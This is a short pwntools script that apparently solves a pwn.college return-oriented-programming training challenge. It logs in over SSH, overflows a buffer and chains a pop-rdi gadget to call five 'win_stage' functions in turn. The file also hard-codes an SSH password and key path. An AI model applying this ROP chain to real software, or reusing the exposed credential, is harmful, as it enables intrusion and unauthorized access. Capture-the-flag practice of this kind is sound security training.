from pwn import *

e = ELF('./babyrop_level3_testing1')
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",keyfile='../../csec',port=22,password='djaxod12')

p = s.run('/babyrop_level3_testing1')

rdi = 0x0000000000401823

p.recvuntil(b'\n\n')

pay = b'A' * 0x78
for i in range(1,6):
    pay += p64(rdi) + p64(i) + p64(e.symbols[f'win_stage_{i}'])

p.send(pay)

p.interactive()